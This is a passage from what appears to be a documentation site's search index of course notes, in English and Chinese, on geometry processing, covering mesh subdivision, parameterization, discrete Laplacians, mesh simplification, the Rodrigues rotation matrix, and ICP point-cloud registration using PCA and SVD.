<li>Connect points to form new edges.</li> <li>Store new faces (1 face -&gt; 4 faces)</li> </ol>"},{"location":"notes/VCI/Chapter%2008%20Geometry%20Representations/#52-loop-subdivision","title":"5.2 Loop subdivision","text":"<p>A common subdivision rule for triangle meshes. </p>"},{"location":"notes/VCI/Chapter%2008%20Geometry%20Representations/#6-mesh-parameterization","title":"6. Mesh parameterization","text":"<p>A function that puts input surface in one-to-one correspondence with a 2D domain.</p> <p>\u200b\u5f39\u7c27\u200b\u7cfb\u7edf\u200b: \u200b\u5c06\u200b\u6bcf\u200b\u6761\u8fb9\u200b\u770b\u4f5c\u200b\u4e00\u4e2a\u200b\u5f39\u7c27\u200b, \u200b\u52b2\u5ea6\u7cfb\u6570\u200b\u4e3a\u200b \\(D_{ij}\\), \u200b\u81ea\u53d8\u91cf\u200b\u4e3a\u200b\u7eb9\u7406\u200b\u5750\u6807\u200b \\(t_i=(u_i,v_i)\\), \u200b\u5219\u200b\u5f39\u7c27\u200b\u80fd\u91cf\u200b $$ E=\\frac{1}{2}\\sum_{i=1}^{n}\\sum_{j\\in neighbor(i)} \\frac{1}{2}D_{ij}||t_i-t_j||^2 $$</p> <p>\u200b\u5f53\u200b \\(E\\) \u200b\u8fbe\u5230\u200b\u6700\u200b\u5c0f\u65f6\u200b: $$ \\frac{\\partial{E}}{\\partial{t_i}}=\\sum_{j\\in neighbor(i)} D_{ij}(t_i-t_j)=0 \\ $$ $$ t_i=\\sum \\lambda_{ij}t_j,\\lambda_{ij}=\\frac{D_{ij}}{\\sum_{k\\in neighbor(i)} D_{ik}} $$</p> <p>\u200b\u6839\u636e\u200b\u8fd9\u4e2a\u200b\u53ef\u4ee5\u200b\u5217\u51fa\u200b\u65b9\u7a0b\u200b \\(At=0\\), \u200b\u5728\u200b\u8fb9\u754c\u200b\u5904\u200b\u52a0\u4e0a\u200b\u4e00\u4e9b\u200b\u7ea6\u675f\u200b\u907f\u514d\u51fa\u73b0\u200b\u5e73\u51e1\u200b\u89e3\u200b. \u200b\u4f8b\u5982\u200b\u53ef\u4ee5\u200b\u5236\u5b9a\u200b\u8fb9\u754c\u200b\u7684\u200b parameter \u200b\u5750\u6807\u200b.</p> <p>\u200b\u4e00\u822c\u200b \\(\\lambda_{ij}\\) \u200b\u7684\u200b\u9009\u53d6\u200b\u6709\u200b\u51e0\u79cd\u200b\u60c5\u51b5\u200b: - average: \\(\\lambda_{ij}=\\frac{1}{n_i}, n_i \u200b\u4e3a\u200b i \u200b\u90bb\u5c45\u200b\u6570\u91cf\u200b\\) - \u200b\u8c03\u548c\u200b\u5750\u6807\u7cfb\u200b\u6570\u200b: \\(\\lambda_{ij}=(\\cot \\gamma_{ij}+\\cot \\gamma_{ji})/2\\) - \u200b\u5747\u503c\u200b\u5750\u6807\u7cfb\u200b\u6570\u200b: \\(\\lambda_{ij}=(\\tan \\frac{\\beta_{ji}}{2} + \\tan \\frac{\\alpha_{ij}}{2}) / r_{ij}, r_{ij} \u200b\u4e3a\u8fb9\u200b\u7684\u200b\u957f\u5ea6\u200b\\) </p>"},{"location":"notes/VCI/Chapter%2009%20Geometry%20Processing/","title":"Chapter 09 Geometry Processing","text":""},{"location":"notes/VCI/Chapter%2009%20Geometry%20Processing/#1-discrete-differential-geometry","title":"1. Discrete differential geometry","text":"<p>Compute approximations of the differential properties of this underlying surface directly from the mesh data.</p>"},{"location":"notes/VCI/Chapter%2009%20Geometry%20Processing/#11-local-averaging-region","title":"1.1 Local Averaging Region","text":"<p>Key idea: \u200b\u4e3a\u4e86\u200b\u7528\u200b\u79bb\u6563\u200b\u6765\u200b\u903c\u8fd1\u200b\u8fde\u7eed\u200b, \u200b\u6211\u4eec\u200b\u8981\u200b\u5b9a\u4e49\u200b\u4e00\u4e2a\u70b9\u200b\u7684\u200b\u90bb\u57df\u200b, \u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5047\u5b9a\u200b\u67d0\u4e2a\u200b\u5fae\u5206\u200b\u91cf\u200b\u5728\u200b\u90bb\u57df\u200b\u5185\u200b\u53d8\u5316\u200b\u5f88\u5c0f\u200b, \u200b\u770b\u4f5c\u200b\u4e00\u4e2a\u200b\u5b9a\u503c\u200b, \u200b\u8fd9\u6837\u200b\u5c06\u200b\u8fd9\u4e2a\u200b\u90bb\u57df\u200b\u7684\u200b\u79ef\u5206\u200b\u503c\u200b\u9664\u4ee5\u200b\u9762\u79ef\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u5fae\u5206\u200b\u91cf\u200b.</p> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b\u51e0\u79cd\u200b\u5b9a\u4e49\u200b\u90bb\u57df\u200b\u65b9\u5f0f\u200b: </p>"},{"location":"notes/VCI/Chapter%2009%20Geometry%20Processing/#12-normal-vectors","title":"1.2 Normal Vectors","text":""},{"location":"notes/VCI/Chapter%2009%20Geometry%20Processing/#13-gradient","title":"1.3 Gradient","text":"<p>\u200b\u5bf9\u4e8e\u200b\u5355\u4e2a\u200b\u4e09\u89d2\u5f62\u200b, \u200b\u7ed9\u5b9a\u200b\u4e09\u4e2a\u200b\u9876\u70b9\u200b \\(x_i,x_j,x_k\\) \u200b\u4e0a\u200b\u7684\u200b\u51fd\u6570\u200b\u503c\u200b \\(f_i,f_j,f_k\\), \u200b\u4e09\u89d2\u5f62\u200b\u4e0a\u200b\u4efb\u610f\u200b\u4e00\u70b9\u200b\u7684\u200b\u51fd\u6570\u200b\u503c\u200b \\(f(x)\\) \u200b\u53ef\u200b\u6839\u636e\u200b \\(x\\) \u200b\u7684\u200b\u91cd\u5fc3\u5750\u6807\u200b\u63d2\u503c\u200b\u5f97\u5230\u200b. $$ f(x)=\\alpha f_i+\\beta f_j + \\gamma f_k \\ $$ \\(\\alpha, \\beta, \\gamma\\) \u200b\u5206\u522b\u200b\u662f\u200b\u6240\u200b\u5bf9\u200b\u4e09\u89d2\u5f62\u200b\u9762\u79ef\u200b\u4e0e\u200b\u6574\u4e2a\u200b\u4e09\u89d2\u5f62\u200b\u9762\u79ef\u200b\u7684\u200b\u6bd4\u503c\u200b.  \u200b\u90a3\u4e48\u200b \\(f(x)\\) \u200b\u7684\u200b\u68af\u5ea6\u200b\u4e3a\u200b:</p> <p>$$ \\nabla_x=\\nabla_x\\alpha f_i+\\nabla_x\\beta f_j+ \\nabla_x\\gamma f_k $$ </p> <p>\u200b\u53ef\u89c1\u200b, \u200b\u68af\u5ea6\u200b\u5728\u200b\u6bcf\u4e2a\u200b\u4e09\u89d2\u5f62\u200b\u5185\u200b\u4e0d\u53d8\u200b.</p>"},{"location":"notes/VCI/Chapter%2009%20Geometry%20Processing/#14-laplace-beltrami-operator","title":"1.4 Laplace-Beltrami Operator","text":"<ul> <li>Constant gradient on facet -&gt; zero Laplace value</li> <li>Gradient on the vertex: </li> </ul> <p>motivation: $$ f''(x)=\\lim_{\\Delta x\\to0} \\frac{f(x+\\Delta x)-f(x)+f(x-\\Delta x)-f(x)}{2} $$</p> <p>Contangent Formula Uniform $$ \\omega_{ij}=1  or  \\omega_{ij}=\\frac{1}{n_i} $$</p> <p></p>"},{"location":"notes/VCI/Chapter%2009%20Geometry%20Processing/#2-mesh-smoothing","title":"2. Mesh Smoothing","text":""},{"location":"notes/VCI/Chapter%2009%20Geometry%20Processing/#3-detail-preserving-mesh-editing","title":"3. Detail-Preserving Mesh Editing","text":"<p>Key idea: \u200b\u901a\u8fc7\u200b\u4f7f\u5f97\u200b\u65b0\u200b mesh \u200b\u7684\u200b Laplacian \u200b\u4e0e\u200b\u539f\u6765\u200b\u7684\u200b Laplacian \u200b\u66f4\u200b\u63a5\u8fd1\u200b\u4fdd\u7559\u200b\u7ec6\u8282\u200b </p>"},{"location":"notes/VCI/Chapter%2009%20Geometry%20Processing/#4-level-of-detail","title":"4. Level of Detail","text":"<ul> <li>\u200b\u5bf9\u4e8e\u200b\u8fd1\u200b\u7684\u200b\u7269\u4f53\u200b\u4f7f\u7528\u200b\u66f4\u200b\u591a\u200b\u7684\u200b Polygons \u200b\u6e32\u67d3\u200b</li> <li>\u200b\u5bf9\u4e8e\u200b\u8fdc\u200b\u7684\u200b\u7269\u4f53\u200b\u4f7f\u7528\u200b\u66f4\u5c11\u200b\u7684\u200b Polygons \u200b\u6e32\u67d3\u200b</li> </ul>"},{"location":"notes/VCI/Chapter%2009%20Geometry%20Processing/#5-mesh-simplification","title":"5. Mesh Simplification","text":"<ul> <li>Delete unnecessary vertices, edges and triangles</li> <li>\u200b\u79fb\u9664\u200b\u9876\u70b9\u200b </li> <li>\u200b\u8fb9\u200b\u584c\u7f29\u200b </li> </ul> <p>\u200b\u8fb9\u200b\u584c\u7f29\u200b\u7b97\u6cd5\u200b\u662f\u200b\u66f4\u4e3a\u200b\u7b80\u5355\u200b\u800c\u200b\u5e38\u7528\u200b\u7684\u200b, \u200b\u5b83\u200b\u901a\u8fc7\u200b\u9009\u62e9\u200b\u51fa\u8981\u200b\u88ab\u200b\u5220\u9664\u200b\u7684\u200b\u8fb9\u200b, \u200b\u5e76\u200b\u5c06\u200b\u8fb9\u200b\u7684\u200b\u4e24\u4e2a\u200b\u7aef\u70b9\u200b\u5408\u5e76\u200b\u6210\u200b\u4e00\u4e2a\u70b9\u200b\u653e\u5728\u200b\u65b0\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u4e0a\u200b. \u200b\u4e3a\u4e86\u200b\u9009\u62e9\u200b\u8981\u200b\u5220\u9664\u200b\u7684\u200b\u8fb9\u200b, \u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u6709\u200b\u4e00\u79cd\u200b\u8bef\u5dee\u200b\u5ea6\u91cf\u200b, \u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u662f\u200b\u4e8c\u6b21\u200b\u8bef\u5dee\u200b\u5ea6\u91cf\u200b. \u200b\u901a\u8fc7\u200b\u6700\u5c0f\u5316\u200b\u65b0\u200b\u7684\u200b\u9876\u70b9\u200b\u4e0e\u200b\u4e4b\u524d\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5e73\u9762\u200b\u7684\u200b L2 \u200b\u8ddd\u79bb\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u5220\u9664\u200b\u8fd9\u6761\u200b\u8fb9\u4f1a\u200b\u5f15\u5165\u200b\u7684\u200b\u4e8c\u6b21\u200b\u5ea6\u91cf\u200b\u8bef\u5dee\u200b.</p> <p>\u200b\u7ec6\u8282\u200b\u53c2\u89c1\u200b Lab.</p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/","title":"Chapter 10 Geometry Reconstruction","text":""},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#1-basics","title":"1. Basics","text":"<p>\u200b\u7ed5\u200b\u4efb\u610f\u200b\u8f74\u200b\u7684\u200b\u65cb\u8f6c\u200b\u516c\u5f0f\u200b:</p> <p>\u200b\u63a8\u5bfc\u200b\u7ed5\u200b\u5355\u4f4d\u200b\u8f74\u200b \\(\\mathbf{k}\\) \u200b\u65cb\u8f6c\u200b\u89d2\u5ea6\u200b \\(\\theta\\) \u200b\u7684\u200b\u65cb\u8f6c\u200b\u77e9\u9635\u200b\u3002</p> <p>\u200b\u8bbe\u200b\uff1a * \\(\\mathbf{k}\\) \u200b\u662f\u200b\u5355\u4f4d\u200b\u65cb\u8f6c\u8f74\u200b\uff08\\(|\\mathbf{k}|=1\\)\uff09\u3002 * \\(\\theta\\) \u200b\u662f\u200b\u65cb\u8f6c\u200b\u89d2\u5ea6\u200b\u3002 * \\(\\mathbf{v}\\) \u200b\u662f\u200b\u5f85\u200b\u65cb\u8f6c\u200b\u7684\u200b\u5411\u91cf\u200b\u3002 * \\(\\mathbf{v}'\\) \u200b\u662f\u200b\u65cb\u8f6c\u200b\u540e\u200b\u7684\u200b\u5411\u91cf\u200b\u3002</p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#11","title":"1.1 \u200b\u5411\u91cf\u200b\u5206\u89e3","text":"<p>\u200b\u5c06\u200b\u5411\u91cf\u200b \\(\\mathbf{v}\\) \u200b\u5206\u89e3\u200b\u4e3a\u200b\u5e73\u884c\u200b\u4e8e\u200b\u65cb\u8f6c\u8f74\u200b \\(\\mathbf{k}\\) \u200b\u7684\u200b\u5206\u91cf\u200b \\(\\mathbf{v}_{\\parallel}\\) \u200b\u548c\u200b\u5782\u76f4\u4e8e\u200b\u65cb\u8f6c\u8f74\u200b \\(\\mathbf{k}\\) \u200b\u7684\u200b\u5206\u91cf\u200b \\(\\mathbf{v}_{\\perp}\\)\uff1a $\\(\\mathbf{v} = \\mathbf{v}_{\\parallel} + \\mathbf{v}_{\\perp}\\)$</p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#a-mathbfv_parallel","title":"(a) \u200b\u5e73\u884c\u200b\u5206\u91cf\u200b \\(\\mathbf{v}_{\\parallel}\\)","text":"<p>\u200b\u5e73\u884c\u200b\u5206\u91cf\u200b\u5728\u200b\u65cb\u8f6c\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u4fdd\u6301\u200b\u4e0d\u53d8\u200b\uff0c\u200b\u901a\u8fc7\u200b\u70b9\u79ef\u200b\u6c42\u5f97\u200b\uff1a $\\(\\mathbf{v}_{\\parallel} = (\\mathbf{v} \\cdot \\mathbf{k}) \\mathbf{k}\\)$ \u200b\u65cb\u8f6c\u200b\u540e\u200b\uff1a\\(\\mathbf{v}'_{\\parallel} = \\mathbf{v}_{\\parallel}\\)</p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#b-mathbfv_perp","title":"(b) \u200b\u5782\u76f4\u200b\u5206\u91cf\u200b \\(\\mathbf{v}_{\\perp}\\)","text":"<p>\u200b\u5782\u76f4\u200b\u5206\u91cf\u200b\u8868\u793a\u200b\u4e3a\u200b\uff1a $\\(\\mathbf{v}_{\\perp} = \\mathbf{v} - \\mathbf{v}_{\\parallel} = \\mathbf{v} - (\\mathbf{v} \\cdot \\mathbf{k}) \\mathbf{k}\\)$</p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#12-mathbfv_perp","title":"1.2 \u200b\u65cb\u8f6c\u200b\u5782\u76f4\u200b\u5206\u91cf\u200b \\(\\mathbf{v}_{\\perp}\\)","text":"<p>\u200b\u5782\u76f4\u200b\u5206\u91cf\u200b \\(\\mathbf{v}_{\\perp}\\) \u200b\u5728\u200b\u5782\u76f4\u4e8e\u200b \\(\\mathbf{k}\\) \u200b\u7684\u200b\u5e73\u9762\u200b\u5185\u65cb\u8f6c\u200b\u3002\u200b\u6211\u4eec\u200b\u5f15\u5165\u200b\u4e00\u4e2a\u200b\u8f85\u52a9\u200b\u5411\u91cf\u200b \\(\\mathbf{w}\\)\uff0c\u200b\u5b83\u200b\u5782\u76f4\u4e8e\u200b \\(\\mathbf{v}_{\\perp}\\) \u200b\u548c\u200b \\(\\mathbf{k}\\)\uff1a $\\(\\mathbf{w} = \\mathbf{k} \\times \\mathbf{v}\\)$</p> <p>\u200b\u65cb\u8f6c\u200b\u540e\u200b\u7684\u200b\u5782\u76f4\u200b\u5206\u91cf\u200b \\(\\mathbf{v}'_{\\perp}\\) \u200b\u53ef\u4ee5\u200b\u8868\u793a\u200b\u4e3a\u200b \\(\\mathbf{v}_{\\perp}\\) \u200b\u548c\u200b \\(\\mathbf{w}\\) \u200b\u7684\u200b\u7ebf\u6027\u7ec4\u5408\u200b\uff1a $\\(\\mathbf{v}'_{\\perp} = (\\cos\\theta) \\mathbf{v}_{\\perp} + (\\sin\\theta) \\mathbf{w}\\)$</p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#13-mathbfv","title":"1.3 \u200b\u5408\u6210\u200b\u65cb\u8f6c\u200b\u540e\u200b\u7684\u200b\u5411\u91cf\u200b \\(\\mathbf{v}'\\)","text":"<p>\u200b\u5c06\u200b\u65cb\u8f6c\u200b\u540e\u200b\u7684\u200b\u4e24\u4e2a\u200b\u5206\u91cf\u200b\u76f8\u52a0\u200b\uff1a $\\(\\mathbf{v}' = \\mathbf{v}'_{\\parallel} + \\mathbf{v}'_{\\perp} = \\mathbf{v}_{\\parallel} + (\\cos\\theta) \\mathbf{v}_{\\perp} + (\\sin\\theta) \\mathbf{w}\\)$</p> <p>\u200b\u4ee3\u5165\u200b \\(\\mathbf{v}_{\\parallel}\\)\u3001\\(\\mathbf{v}_{\\perp}\\) \u200b\u548c\u200b \\(\\mathbf{w}\\) \u200b\u7684\u200b\u8868\u8fbe\u5f0f\u200b\uff1a $\\(\\mathbf{v}' = (\\mathbf{v} \\cdot \\mathbf{k}) \\mathbf{k} + (\\cos\\theta) \\left( \\mathbf{v} - (\\mathbf{v} \\cdot \\mathbf{k}) \\mathbf{k} \\right) + (\\sin\\theta) (\\mathbf{k} \\times \\mathbf{v})\\)$ \u200b\u6574\u7406\u200b\u5f97\u5230\u200b\u7f57\u5fb7\u91cc\u683c\u65af\u200b\u65cb\u8f6c\u200b\u516c\u5f0f\u200b\u7684\u200b\u5411\u91cf\u200b\u5f62\u5f0f\u200b\uff1a $\\(\\mathbf{v}' = \\mathbf{v} \\cos\\theta + (\\mathbf{k} \\times \\mathbf{v}) \\sin\\theta + \\mathbf{k} (\\mathbf{k} \\cdot \\mathbf{v}) (1 - \\cos\\theta)\\)$  \u200b\u4e3a\u4e86\u200b\u5f97\u5230\u200b \\(\\mathbf{v}' = \\mathbf{R} \\mathbf{v}\\)\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5c06\u70b9\u200b\u79ef\u548c\u53c9\u79ef\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u77e9\u9635\u200b\u4e58\u6cd5\u200b\uff1a  (a) \u200b\u70b9\u79ef\u9879\u200b \\(\\mathbf{k} (\\mathbf{k} \\cdot \\mathbf{v})\\) \u200b\u4f7f\u7528\u200b\u5916\u79ef\u200b\uff08Outer Product\uff09\u200b\u77e9\u9635\u200b \\(\\mathbf{K}_{\\text{outer}} = \\mathbf{k} \\mathbf{k}^T\\)\uff1a $\\(\\mathbf{k} (\\mathbf{k} \\cdot \\mathbf{v}) = (\\mathbf{k} \\mathbf{k}^T) \\mathbf{v}\\)$ $\\(\\mathbf{K}_{\\text{outer}} = \\begin{pmatrix} k_x^2 &amp; k_x k_y &amp; k_x k_z \\\\ k_y k_x &amp; k_y^2 &amp; k_y k_z \\\\ k_z k_x &amp; k_z k_y &amp; k_z^2 \\end{pmatrix}\\)$ (b) \u200b\u53c9\u200b\u79ef\u9879\u200b \\(\\mathbf{k} \\times \\mathbf{v}\\) \u200b\u4f7f\u7528\u200b\u53cd\u5bf9\u200b\u79f0\u200b\u77e9\u9635\u200b \\(\\mathbf{K}_{\\times}\\) \u200b\u6765\u200b\u8868\u793a\u200b\u53c9\u79ef\u200b\uff1a $\\(\\mathbf{k} \\times \\mathbf{v} = \\mathbf{K}_{\\times} \\mathbf{v}\\)$ $\\(\\mathbf{K}_{\\times} = \\begin{pmatrix} 0 &amp; -k_z &amp; k_y \\\\ k_z &amp; 0 &amp; -k_x \\\\ -k_y &amp; k_x &amp; 0 \\end{pmatrix}\\)$ (c) \u200b\u5b8c\u6574\u200b\u7684\u200b\u65cb\u8f6c\u200b\u77e9\u9635\u200b \\(\\mathbf{R}\\) \u200b\u5c06\u200b\u5411\u91cf\u200b\u5f62\u5f0f\u200b\u7684\u200b\u516c\u5f0f\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u77e9\u9635\u200b\u4e58\u6cd5\u200b\uff0c\u200b\u5e76\u200b\u5229\u7528\u200b\u5355\u4f4d\u77e9\u9635\u200b \\(\\mathbf{I} \\mathbf{v} = \\mathbf{v}\\)\uff1a $\\(\\mathbf{v}' = (\\mathbf{I} \\cos\\theta) \\mathbf{v} + (\\mathbf{K}_{\\times} \\sin\\theta) \\mathbf{v} + (\\mathbf{K}_{\\text{outer}} (1 - \\cos\\theta)) \\mathbf{v}\\)$ \u200b\u6700\u7ec8\u200b\u7684\u200b\u65cb\u8f6c\u200b\u77e9\u9635\u200b \\(\\mathbf{R}\\) \u200b\u4e3a\u200b\uff1a $\\(\\mathbf{R} = \\mathbf{I} \\cos\\theta + \\mathbf{K}_{\\times} \\sin\\theta + \\mathbf{K}_{\\text{outer}} (1 - \\cos\\theta)\\)$ \u200b\u6700\u7ec8\u200b\u65cb\u8f6c\u200b\u77e9\u9635\u200b \u200b\u8bbe\u200b \\(c = \\cos\\theta\\) \u200b\u548c\u200b \\(s = \\sin\\theta\\)\uff0c\u200b\u5c06\u200b\u5404\u9879\u200b\u77e9\u9635\u200b\u4ee3\u5165\u200b\uff0c\u200b\u5f97\u5230\u200b \\(3 \\times 3\\) \u200b\u65cb\u8f6c\u200b\u77e9\u9635\u200b \\(\\mathbf{R}\\)\uff1a $\\(\\mathbf{R} = \\begin{pmatrix} c + k_x^2(1-c) &amp; k_x k_y(1-c) - k_z s &amp; k_x k_z(1-c) + k_y s \\\\ k_y k_x(1-c) + k_z s &amp; c + k_y^2(1-c) &amp; k_y k_z(1-c) - k_x s \\\\ k_z k_x(1-c) - k_y s &amp; k_z k_y(1-c) + k_x s &amp; c + k_z^2(1-c) \\end{pmatrix}\\)$</p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#2-registration","title":"2. Registration","text":"<p>\u200b\u5728\u200b\u51e0\u4f55\u200b\u91cd\u5efa\u200b\u4e2d\u200b\uff0c\u200b\u6211\u4eec\u200b\u5f80\u5f80\u200b\u4f1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b\u573a\u666f\u200b\u7684\u200b\u4e0d\u540c\u200b\u533a\u57df\u200b\u5206\u522b\u200b\u91c7\u96c6\u200b\u70b9\u4e91\u200b\u6570\u636e\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5c40\u90e8\u200b\u70b9\u4e91\u200b\u90fd\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b\u70b9\u4e91\u200b\u914d\u51c6\u200b\u8fc7\u7a0b\u200b\u878d\u5408\u200b\u8fdb\u200b\u5168\u5c40\u200b\u5750\u6807\u7cfb\u200b\u4e2d\u200b\uff0c\u200b\u624d\u80fd\u200b\u5f97\u5230\u200b\u5b8c\u6574\u200b\u7684\u200b\u6700\u7ec8\u200b\u7ed3\u679c\u200b\u3002 \u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u5c31\u200b\u9700\u8981\u200b\u4e3a\u70b9\u200b\u4e91\u200b\u4e4b\u95f4\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u5408\u9002\u200b\u7684\u200b\u53d8\u6362\u200b, \u200b\u4f7f\u5f97\u200b\u53d8\u6362\u200b\u540e\u200b\u7684\u200b\u4e24\u7ec4\u200b\u70b9\u4e91\u200b\u5b9e\u73b0\u200b\u5bf9\u9f50\u200b. </p> <p>ICP: Iterative Closet Point</p> <p> </p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#21-icp-pca-initialize","title":"2.1 ICP: PCA Initialize","text":"<p>PCA: \u200b\u4e3b\u200b\u6210\u5206\u200b\u5206\u6790\u200b, \u200b\u627e\u5230\u200b\u4e00\u7ec4\u200b\u6570\u636e\u200b\u4e2d\u200b\u53d8\u5316\u200b\u6700\u5927\u200b\u7684\u200b\u65b9\u5411\u200b (\u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u4e3a\u200b\u5c06\u200b\u6570\u636e\u200b\u6295\u5f71\u200b\u5230\u200b\u8fd9\u4e2a\u200b\u65b9\u5411\u200b\u4e0a\u200b\u6700\u200b\u5206\u6563\u200b)</p> <p>\u200b\u8003\u8651\u200b\u4e00\u7ec4\u200b\u70b9\u200b\u4e2d\u5fc3\u5316\u200b\u540e\u200b(\u200b\u6bcf\u4e2a\u200b\u70b9\u200b\u51cf\u53bb\u200b\u91cd\u5fc3\u5750\u6807\u200b)\u200b\u6784\u6210\u200b\u7684\u200b\u77e9\u9635\u200b \\(P_{n\\times 3}\\) , \u200b\u5982\u679c\u200b\u6211\u4eec\u200b\u5c06\u200b\u6570\u636e\u200b\u6295\u5f71\u200b\u5230\u200b\u4efb\u610f\u200b\u4e00\u4e2a\u200b\u5355\u4f4d\u200b\u65b9\u5411\u200b \\(u\\) \u200b\u4e0a\u200b, \u200b\u6295\u5f71\u200b\u540e\u200b\u7684\u200b\u70b9\u96c6\u200b \\(\\{y_i\\}\\) \u200b\u7684\u200b\u65b9\u5dee\u200b \\(Var(y)\\) \u200b\u53ef\u200b\u8ba1\u7b97\u200b\u4e3a\u200b:</p> <p>$$ Var(y)=\\frac{1}{m}\\sum_{i=1}^{m} y_i^2 $$ \u200b\u6295\u5f71\u200b\u540e\u200b\u7684\u200b\u5411\u91cf\u200b \\(y=Pu\\), \u200b\u4e8e\u662f\u200b $$ \\begin{align} Var(y)=Var(Pu)&amp;=\\frac{1}{m}(Pu)'(Pu)\\ &amp;=u'(\\frac{1}{m}P'P)u \\end{align} $$ \u200b\u8fd9\u662f\u200b\u5411\u91cf\u200b \\(u\\) \u200b\u5bf9\u5e94\u200b\u7684\u200b\u4e8c\u6b21\u200b\u578b\u200b \\(u'Cu\\) \u200b\u7684\u200b\u503c\u200b, \u200b\u800c\u200b\u5b83\u200b\u7684\u200b\u6700\u5927\u503c\u200b\u6b63\u662f\u200b \\(C\\) \u200b\u7684\u200b\u6700\u5927\u200b\u7279\u5f81\u503c\u200b (\u200b\u7ed9\u5b9a\u200b \\(||u||=1\\))</p> <p>u'Cu \u200b\u6700\u5927\u503c\u200b\u7684\u200b\u63a8\u5bfc\u200b</p> <p>\u200b\u7531\u4e8e\u200b \\(C\\) \u200b\u662f\u200b\u5bf9\u79f0\u200b\u77e9\u9635\u200b, \u200b\u4e8e\u662f\u200b\u603b\u662f\u200b\u53ef\u4ee5\u200b\u6b63\u4ea4\u200b\u5bf9\u200b\u89d2\u5316\u200b, \u200b\u6b63\u4ea4\u53d8\u6362\u200b\u6539\u53d8\u200b\u6a21\u957f\u200b, \u200b\u6545\u200b\u4e8c\u6b21\u200b\u578b\u200b\u53d8\u4e3a\u200b \\(u'\\Sigma u\\), \u200b\u5176\u4e2d\u200b\\(\\Sigma\\) \u200b\u662f\u200b\u5bf9\u89d2\u200b\u77e9\u9635\u200b, \u200b\u8fd9\u6837\u200b\u5bb9\u6613\u200b\u5199\u51fa\u200b\u4e8c\u6b21\u200b\u578b\u200b\u7684\u200b\u8868\u8fbe\u5f0f\u200b\u4e3a\u200b \\(\\lambda_1u_1^2+\\lambda_2 u_2^2+\\cdots+\\lambda_n u_n^2\\), \u200b\u5728\u200b \\(||u||=1\\) \u200b\u7684\u200b\u6761\u4ef6\u200b\u4e0b\u200b\u663e\u7136\u200b\u8ba9\u200b\u7279\u5f81\u503c\u200b\u6700\u5927\u200b\u7684\u200b\u5bf9\u5e94\u200b\u5206\u91cf\u200b\u4e3a\u200b \\(1\\) \u200b\u6709\u200b\u6700\u5927\u503c\u200b.</p> <p>\u200b\u6784\u5efa\u200b\u534f\u65b9\u5dee\u200b\u77e9\u9635\u200b \\(M=P'P\\) , \u200b\u627e\u5230\u200b \\(M\\) \u200b\u7279\u5f81\u503c\u200b\u6700\u5927\u200b\u7684\u200b\u65b9\u5411\u200b(\u200b\u6ce8\u610f\u200b\u5230\u200b \\(M\\) \u200b\u662f\u200b\u534a\u200b\u6b63\u5b9a\u200b\u77e9\u9635\u200b, \u200b\u7279\u5f81\u503c\u200b\u5168\u4e3a\u200b\u6b63\u6570\u200b).</p> <p>\u200b\u8bb0\u200b\u4e24\u7ec4\u200b\u70b9\u4e91\u4e3a\u200b \\(S,T\\) , \u200b\u4e2d\u5fc3\u200b\u5206\u522b\u200b\u4e3a\u200b \\(c_S,c_T\\). \u200b\u5f97\u5230\u200b\u4e24\u7ec4\u200b\u70b9\u4e91\u200b\u7684\u200b\u4e3b\u200b\u6210\u5206\u200b\u540e\u200b, \u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u65cb\u8f6c\u200b\u77e9\u9635\u200b\\(R\\)\u200b\u4f7f\u5f97\u200b\u4e24\u7ec4\u200b\u70b9\u4e91\u200b\u7684\u200b\u8f74\u200b\u5206\u522b\u200b\u5bf9\u9f50\u200b. \u200b\u6700\u7ec8\u200b: $$ p_i'=Rp_i+t=c_T+R(p_i-c_S) $$ \u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b R \u200b\u548c\u200b t \u200b\u7684\u200b\u6700\u7ec8\u200b\u7ed3\u679c\u200b.</p> <p>PCA initialize \u200b\u7684\u200b\u76ee\u7684\u200b\u5c31\u662f\u200b\u5148\u200b\u627e\u5230\u200b\u4e00\u7cfb\u5217\u200b\u5408\u7406\u200b\u5339\u914d\u200b\u7684\u200b\u70b9\u200b\u5bf9\u200b.</p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#22-icp-svd","title":"2.2 ICP: SVD","text":"<p>  \u200b\u6211\u4eec\u200b\u8981\u200b\u6700\u5927\u5316\u200b \\(\\text{Trace} (\\mathbf{\\Sigma} \\mathbf{M})\\)\uff1a $\\(\\text{Trace} (\\mathbf{\\Sigma} \\mathbf{M}) = \\sum_{i} \\sigma_i M_{ii}\\)$ \u200b\u7531\u4e8e\u200b\u6240\u6709\u200b\u5947\u5f02\u200b\u503c\u200b \\(\\sigma_i \\geq 0\\)\uff0c\u200b\u4e14\u200b \\(\\mathbf{M}\\) \u200b\u662f\u200b\u6b63\u4ea4\u200b\u77e9\u9635\u200b\uff08\\(|M_{ii}| \\leq 